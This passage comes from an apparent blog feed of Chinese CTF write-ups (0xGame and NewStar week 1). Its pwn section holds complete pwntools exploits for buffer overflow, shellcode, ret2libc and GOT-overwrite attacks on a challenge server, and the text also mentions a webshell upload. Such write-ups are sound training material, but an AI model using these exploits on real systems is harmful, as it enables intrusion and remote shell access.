src="/0xGame-week1/r_1_1.png"></p><h2 id="代码金丹"><a href="#代码金丹" class="headerlink" title="代码金丹"></a>代码金丹</h2><p>同样ida32打开在main函数看到flag。</p><p><img src="/0xGame-week1/r_2_1.png"></p><h2 id="网络元婴"><a href="#网络元婴" class="headerlink" title="网络元婴"></a>网络元婴</h2><p>ida64打开在main函数看到flag。</p><p><img src="/0xGame-week1/r_3_1.png"></p><h2 id="虚拟化神"><a href="#虚拟化神" class="headerlink" title="虚拟化神"></a>虚拟化神</h2><p>先运行一次程序，会生成一个<code>config.txt</code>的文件，修改<code>config.txt</code>的<code>0</code>为<code>1</code>，再运行一次即可得到flag。</p><h2 id="赛博天尊"><a href="#赛博天尊" class="headerlink" title="赛博天尊"></a>赛博天尊</h2><p>ida64打开，查看main函数。</p><p><img src="/0xGame-week1/r_5_1.png"></p><p>很显然需要用z3来解方程。</p><p>先安装z3。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pip install z3_solver</span><br></pre></td></tr></table></figure><p>之后就写脚本解方程，将得到的结果拼接起来，得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v7, v8, v9, v10, v11 = Ints(<span class="string">&#x27;v7 v8 v9 v10 v11&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">7</span> * v9 + <span class="number">5</span> * (v8 + v11) + <span class="number">2</span> * (v10 + <span class="number">4</span> * v7) == <span class="number">0x12021DE669FC2</span>)</span><br><span class="line">s.add(v8 + <span class="number">2</span> * (v9 + v10 + <span class="number">2</span> * v10 + <span class="number">2</span> * (v11 + v7)) + (v9 + v10 + <span class="number">2</span> * v10 + <span class="number">2</span> * (v11 + v7)) == <span class="number">0x159BFFC17D045</span>)</span><br><span class="line">s.add(v10 + v9 + v11 + <span class="number">2</span> * v9 + <span class="number">2</span> * (v9 + v11 + <span class="number">2</span> * v9) + <span class="number">2</span> * (v8 + <span class="number">4</span> * v7) == <span class="number">0xACE320D12501</span>)</span><br><span class="line">s.add(v8 + <span class="number">2</span> * (v7 + v11 + v9 + <span class="number">2</span> * v10) == <span class="number">0x733FFEB3A4FA</span>)</span><br><span class="line">s.add(v8 + <span class="number">7</span> * v11 + <span class="number">8</span> * (v9 + v10) + <span class="number">5</span> * v7 == <span class="number">0x1935EBA54EB28</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[v11 = 63356652901730,</span></span><br><span class="line"><span class="string"> v7 = 2693650760,</span></span><br><span class="line"><span class="string"> v10 = 41791,</span></span><br><span class="line"><span class="string"> v9 = 16488,</span></span><br><span class="line"><span class="string"> v8 = 14810]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">v11 = <span class="number">63356652901730</span></span><br><span class="line">v7 = <span class="number">2693650760</span></span><br><span class="line">v10 = <span class="number">41791</span></span><br><span class="line">v9 = <span class="number">16488</span></span><br><span class="line">v8 = <span class="number">14810</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;0xGame&#123;&quot;</span>+<span class="built_in">hex</span>(v7)[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(v8)[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(v9)[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(v10)[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(v11)[<span class="number">2</span>:]+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#0xGame&#123;a08dd948-39da-4068-a33f-399f5eca5562&#125;</span></span><br></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="找不到且不对劲的flag"><a href="#找不到且不对劲的flag" class="headerlink" title="找不到且不对劲的flag"></a>找不到且不对劲的flag</h2><p>nc 连接，然后<code>ls -la</code>，可以看到有一个<code>.secret</code>的文件夹，flag就在那个文件夹里。</p><h2 id="永远进不去的后门"><a href="#永远进不去的后门" class="headerlink" title="永远进不去的后门"></a>永远进不去的后门</h2><p>简单的栈溢出，找到后门的地址直接跳过去就行了。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./ret2text&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51002</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x401298</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Tell me sth interesting, and I will give you what you want.\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="随便乱搞的shellcode"><a href="#随便乱搞的shellcode" class="headerlink" title="随便乱搞的shellcode"></a>随便乱搞的shellcode</h2><p><img src="/0xGame-week1/p_1_1.png"></p><p>没有后门函数，程序会将<code>buf[rand()%256]</code>的部分当成代码执行，因此我们需要控制shellcode在这里。</p><p>有<code>close(1);</code>，所以要来上一个<code>exec 1&gt;&amp;0</code></p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#cal =  process(&#x27;./ret2shellcode&#x27;)</span></span><br><span class="line">cal = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51003</span>)</span><br><span class="line">elf = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">elf.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">off = elf.rand()</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(off%<span class="number">256</span>) + sc</span><br><span class="line">cal.sendlineafter(<span class="string">b&quot;code:&quot;</span>,payload)</span><br><span class="line">cal.sendline(<span class="string">b&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cal.interactive()</span><br></pre></td></tr></table></figure><p><img src="/0xGame-week1/p_1_2.png"></p><h2 id="我后门呢？"><a href="#我后门呢？" class="headerlink" title="我后门呢？"></a>我后门呢？</h2><p>参考链接：</p><ol><li><a href="https://blog.csdn.net/weixin_45943522/article/details/120469196">https://blog.csdn.net/weixin_45943522/article/details/120469196</a></li><li><a href="https://blog.csdn.net/Mintind/article/details/128165311">https://blog.csdn.net/Mintind/article/details/128165311</a></li><li><a href="https://libc.blukat.me/">https://libc.blukat.me/</a></li></ol><p>用<code>ROPgadget</code>找<code>rid</code>和<code>ret</code>的地址。</p><p><img src="/0xGame-week1/p_2_2.png"></p><p>泄露出<code>puts</code>的地址。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2libc&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51005</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401333</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span> + <span class="number">7</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:\n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())  <span class="comment">#p.recvuntil(&#x27;\x0a&#x27;)</span></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"><span class="comment">#puts_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># 0x7f79a6363420</span></span><br></pre></td></tr></table></figure><p>然后用 <code>libc database search</code> 找 <code>system</code> 和 <code>/bin/sh</code> 的地址。</p><p><img src="/0xGame-week1/p_2_1.png"></p><p>最后用<code>puts</code>算出基地址，在第二次栈溢出时<code>getshell</code>。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2libc&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51005</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401333</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span> + <span class="number">7</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:\n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())  <span class="comment">#p.recvuntil(&#x27;\x0a&#x27;)</span></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"><span class="comment">#puts_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_offset = <span class="number">0x052290</span></span><br><span class="line">puts_offset = <span class="number">0x084420</span></span><br><span class="line">sh_offset = <span class="number">0x1b45bd</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">binsh = libc_base + sh_offset</span><br><span class="line">system = libc_base + sys_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>-<span class="number">1</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="高端的syscall"><a href="#高端的syscall" class="headerlink" title="高端的syscall"></a>高端的syscall</h2><p>同样拿<code>ret2libc</code>打的。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2syscall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51004</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2syscall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4012e3</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span> + <span class="number">8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input: \n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">sys_offset = <span class="number">0x052290</span></span><br><span class="line">puts_offset = <span class="number">0x084420</span></span><br><span class="line">sh_offset = <span class="number">0x1b45bd</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">binsh = libc_base + sh_offset</span><br><span class="line">system = libc_base + sys_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input: \n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="字符串和随机数"><a href="#字符串和随机数" class="headerlink" title="字符串和随机数"></a>字符串和随机数</h2><p><img src="/0xGame-week1/p_3_1.png"></p><ol><li>通过将<code>name</code>填充满，把<code>seed</code>泄露出来。</li><li><code>pass</code>需要以<code>\x00</code>结尾。</li><li>泄露出<code>seed</code>后要先把<code>seed</code>逆序，再转成10进制数。（踩到的坑）</li></ol><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;8.130.35.16&#x27;, 51001)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name: &#x27;</span>,<span class="string">&quot;adminaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Password: &#x27;</span>,<span class="string">&quot;1s_7h1s_p9ss_7tuIy_sAf3?\x00&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome back, adminaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span>)</span><br><span class="line">a = p.recv(<span class="number">4</span>)[::-<span class="number">1</span>]</span><br><span class="line">seed = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">aa = <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(aa)==<span class="number">1</span>:</span><br><span class="line">aa=<span class="string">&#x27;0&#x27;</span>+aa</span><br><span class="line">seed +=aa</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line">seed = <span class="built_in">int</span>(seed,<span class="number">16</span>)</span><br><span class="line">elf.srand(seed)</span><br><span class="line">v3 = elf.rand() </span><br><span class="line">v2 = elf.rand() </span><br><span class="line">v3 = v3 ^ <span class="number">0xD0E0A0D0</span></span><br><span class="line">v2 = v2 ^ <span class="number">0xB0E0E0F</span></span><br><span class="line">v1 = (v3^v2)%<span class="number">0xF4240</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Wanna see it?&#x27;</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;continue: &#x27;</span>,<span class="built_in">str</span>(v1))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="got-it"><a href="#got-it" class="headerlink" title="got-it"></a>got-it</h2><p>数组溢出修改got表。</p><p><img src="/0xGame-week1/p_4_1.png"></p><p><img src="/0xGame-week1/p_4_2.png"></p><p><img src="/0xGame-week1/p_4_3.png"></p><p><img src="/0xGame-week1/p_4_4.png"></p><p>思路：修改got表，将<code>exit</code>的地址改成<code>system</code>的地址，之后让v3&#x3D;&#x3D;8227，即可getshell。</p><p>先泄露出<code>puts</code>的地址。通过ida可以看到，list数组的地址为<code>0x4040A0</code>，<code>exit</code>的地址为<code>0x404048</code>，<code>puts</code>的地址为<code>0x404018</code>。</p><p><img src="/0xGame-week1/p_4_5.png"></p><p>通过计算，<code>(0x4040A0 - 0x404018)/8 = 17</code>，<code>(0x4040A0 - 0x404048)/8 = 11</code> 。根据这些，可以直接读<code>list[-17]</code>把<code>puts</code>的真实地址读出来，然后去算出<code>libc</code>的基地址，再根据基地址算出<code>system</code>的真实地址，之后在<code>list[-11]</code>处将<code>exit</code>的地址改成<code>system</code>的地址。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./got-it&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51006</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./got-it&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input student id:&#x27;</span>,<span class="string">&#x27;-17&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">sys_offset = <span class="number">0x052290</span></span><br><span class="line">puts_offset = <span class="number">0x084420</span></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">system = libc_base + sys_offset</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input student id:&#x27;</span>,<span class="string">&#x27;-11&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Input student name:&#x27;</span>,p64(system))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;8227&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/0xGame-week1/p_4_6.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>先base64解码再base32解码，得到flag。</p><h2 id="shark-shark"><a href="#shark-shark" class="headerlink" title="shark shark"></a>shark shark</h2><p>wireshark打开，发现有一堆TCP的数据。</p><p>用记事本打开，可以看到这里有一串16进制的数据，是一个zip压缩包。</p><p><img src="/0xGame-week1/m_2_1.png"></p><p>提取出来后，发现压缩包是加密的。</p><p>最后追踪rcp流，得到密码。</p><p><img src="/0xGame-week1/m_2_2.png"></p><p>解压文件后即可得到flag。</p><h2 id="least-and-most"><a href="#least-and-most" class="headerlink" title="least and most"></a>least and most</h2><p>用<code>Stegsolve</code>打开文件，查看最低位能看到flag的前半。</p><p><img src="/0xGame-week1/m_3_1.png"></p><p>查看最高位能看到flag的后半。</p><p><img src="/0xGame-week1/m_3_2.png"></p><h2 id="重生之我在教学楼打cs"><a href="#重生之我在教学楼打cs" class="headerlink" title="重生之我在教学楼打cs"></a>重生之我在教学楼打cs</h2><p>hint:</p><p><img src="/0xGame-week1/m_4_1.png"></p><p>下载一个<code>BSPViewer</code>，下载地址：<a href="https://www.jb51.net/softs/644965.html">https://www.jb51.net/softs/644965.html</a></p><p>用<code>BSPViewer</code>打开文件，找到那个鼎，在鼎的最下角找到flag。</p><p><img src="/0xGame-week1/m_4_2.png"></p><h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><p>由题目描述和提示可以知道这个jpg文件用了<code>steghide</code>来隐写，但不知道密钥。使用<code>stegseek</code>搭配上kali的<code>rockyou</code>字典来爆破密钥。</p><p><img src="/0xGame-week1/m_6_1.png"></p><p>爆破出密钥后即可得到flag。</p><p><img src="/0xGame-week1/m_6_2.png"></p><h2 id="another-signin"><a href="#another-signin" class="headerlink" title="another signin"></a>another signin</h2><p>区块链签到题。</p><p>参考视频：<a href="https://www.bilibili.com/video/BV1Xe4y1e7sQ/">【CTF】区块链–合约题入门操作 区块链题型简介 水龙头的对比 remixIDE的基本使用 1——NewStarCTF</a></p><p>基本跟着视频做就行了。</p><p>先安装好小狐狸<code>metamask</code>。</p><p>在小狐狸中添加<code>rpc</code>，也就是合约网络，网络内容如下。</p><p><img src="/0xGame-week1/m_5_1.png"></p><p>nc 连接，先 1 创建一个账户，然后用小狐狸转账<code>0.001</code>，接着 2 查看创建是否成功，成功后会返回类似下面的信息。</p><p><img src="/0xGame-week1/m_5_2.png"></p><p>查看 4 ，获取源码。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.9</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Greeter</span> &#123;</span><br><span class="line">    string greeting;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">string memory _greeting</span>) &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params"></span>) public view returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setGreeting</span>(<span class="params">string memory _greeting</span>) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isSolved</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        string memory expected = <span class="string">&quot;Love0xGame&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(expected)) == <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(greeting));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <a href="https://remix.ethereum.org/">在线网站</a> 编写合约。</p><p>exp:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract exp&#123;</span><br><span class="line">    address transcation= <span class="number">0x4Bc4FC689aEA6D588B2cad1F4213430bf3Cea410</span>;</span><br><span class="line">    <span class="title class_">Greeter</span> target=<span class="title class_">Greeter</span>(transcation);</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)payable&#123;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hack</span>(<span class="params"></span>) public <span class="title function_">returns</span>(<span class="params">bool</span>)&#123;</span><br><span class="line">        bool ans=<span class="literal">false</span>;</span><br><span class="line">        string memory greeting=<span class="string">&quot;Love0xGame&quot;</span>;</span><br><span class="line">        target.<span class="title function_">setGreeting</span>(greeting);</span><br><span class="line">        ans=target.<span class="title function_">isSolved</span>();</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击后即可得到flag。</p><p><img src="/0xGame-week1/m_5_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
          <category> 新生赛 </category>
          
          <category> ak </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
            <tag> re </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar-CTF-Week1</title>
      <link href="/NewStar-CTF-Week1/"/>
      <url>/NewStar-CTF-Week1/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStar-CTF-week1"><a href="#NewStar-CTF-week1" class="headerlink" title="NewStar CTF week1"></a>NewStar CTF week1</h1><p>全部ak了，排名第九。</p><p><img src="/NewStar-CTF-Week1/1111.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><ol><li><p>直接访问<code>www.zip</code>，发现下载了源码。</p></li><li><p>压缩包内有两个文件。</p><p><img src="/NewStar-CTF-Week1/w_1_1.png"></p></li><li><p>查看这两个文件即可得到flag。</p></li></ol><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>只有前端过滤，bp抓包直接上传一句话木马就行了。</p><p><img src="/NewStar-CTF-Week1/w_2_1.png"></p><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><ol><li><p>按照题目要求，get传入<code>number1</code>和<code>number2</code>，能够计算结果。</p><p><img src="/NewStar-CTF-Week1/w_3_1.png"></p></li><li><p>传入一个非数字，进入<code>debug</code>，在<code>debug</code>页面找到了flag。</p><p><img src="/NewStar-CTF-Week1/w_3_2.png"></p></li></ol><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><ol><li><p>根据要求，get传入<code>ctf=x</code>。</p></li><li><p>查看源码发现了提示，将 字符串base64解码，post传入<code>secret=n3wst4rCTF2023g00000d</code>。</p><p><img src="/NewStar-CTF-Week1/w_4_1.png"></p></li><li><p><code>Cookie</code>传入<code>power=ctfer</code>。</p></li><li><p><code>User-Agent</code>改为<code> NewStarCTF2023</code>。</p></li><li><p>添加<code>referer</code>为<code>newstarctf.com</code>。</p></li><li><p>参考 